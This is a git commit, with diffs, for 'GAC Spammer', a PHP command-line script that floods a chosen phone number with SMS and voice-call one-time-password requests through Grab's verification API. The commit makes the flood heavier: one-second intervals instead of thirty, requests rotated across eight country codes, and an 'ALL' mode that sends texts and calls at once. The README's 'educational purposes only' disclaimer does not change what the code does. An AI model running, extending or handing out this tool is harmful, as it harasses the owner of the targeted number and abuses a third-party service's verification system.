567c94db57abdb43c0078b0cf77b65f67080c07e
Likecyber <cyber2friends@gmail.com>
2019-02-03 01:31:34 +0700

    Updated: CALL from 8 different countries, new ALL spam-type.
    - Spamming will now continue 1 second after last request instead of 30 seconds for best efficiency. (2019-02-03)
    - Request CALL OTP will be made from 8 different countries. (2019-02-03)
    - Spamming SMS and CALL at once is possible by "ALL" spam-type.  (2019-02-03)
    - Succeed OTP Request output will now show spam-type. (2019-02-03)
    - Unusual Response Warning output will now be removed. (2019-02-03)
    - Hit number on the title will now parse to Number Format. (2019-02-03)

--- GAC_Spammer.php
+++ GAC_Spammer.php
@@ -1,34 +1,40 @@
 <?php
 
-if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL"]))) {
-	echo "Usage: php ".basename(__FILE__)." <phone_number> [SMS|CALL]\n";
+if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL", "ALL"]))) {
+	echo "Usage: php ".basename(__FILE__)." <phone_number> [SMS|CALL|ALL]\n";
 	exit;
 } elseif (!isset($argv[2])) {
 	$argv[2] = "SMS";
 }
 
+$countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];
+shuffle($countries);
+
 $ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");
 curl_setopt_array($ch, [
 	CURLOPT_RETURNTRANSFER => true,
-	CURLOPT_SSL_VERIFYPEER => false,
-	CURLOPT_POSTFIELDS => "method=".$argv[2]."&countryCode=TH&phoneNumber=".$argv[1]."&templateID=&numDigits=4"
+	CURLOPT_SSL_VERIFYPEER => false
 ]);
 
 if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - 0 Hits");
 
+$last_success = ["SMS" => 0, "CALL" => 0];
+
 $i = 0;
 while (true) {
-	curl_exec($ch);
-	switch (curl_getinfo($ch, CURLINFO_HTTP_CODE)) {
-		case 200:
-			echo date("[H:i:s]")." OTP Requested.\n";
-			if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".++$i." Hits");
-			sleep(30);
-			break;
-		default:
-			echo date("[H:i:s]")." Unusual Response, Retrying...\n";
-			sleep(1);
+	foreach ($countries as $countryCode) {
+		foreach (["SMS", "CALL"] as $method) {
+			if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
+				curl_setopt($ch, CURLOPT_POSTFIELDS, "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4");
+				curl_exec($ch);
+				if (curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200) {
+					echo date("[H:i:s]")." ".$method." OTP Requested.\n";
+					if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".number_format(++$i)." Hits");
+				}
+			}
+		}
 	}
+	sleep(1);
 }
 
 ?>
--- README.md
+++ README.md
@@ -2,10 +2,20 @@
 The open source version of GAC (Grab Activation Code) Spammer written in PHP for CLI.
 
 ```cmd
-Usage: php GAC_Spammer.php <phone_number> [SMS|CALL]
+Usage: php GAC_Spammer.php <phone_number> [SMS|CALL|ALL]
 ```
 
 ---
 
 ## Disclaimer
 This project is intended for educational purposes only. Developer is not responsible for any misuse.
+
+---
+
+### Changelog
+- Spamming will now continue 1 second after last request instead of 30 seconds for best efficiency. (2019-02-03)
+- Request CALL OTP will be made from 8 different countries. (2019-02-03)
+- Spamming SMS and CALL at once is possible by "ALL" spam-type.  (2019-02-03)
+- Succeed OTP Request output will now show spam-type. (2019-02-03)
+- Unusual Response Warning output will now be removed. (2019-02-03)
+- Hit number on the title will now parse to Number Format. (2019-02-03)
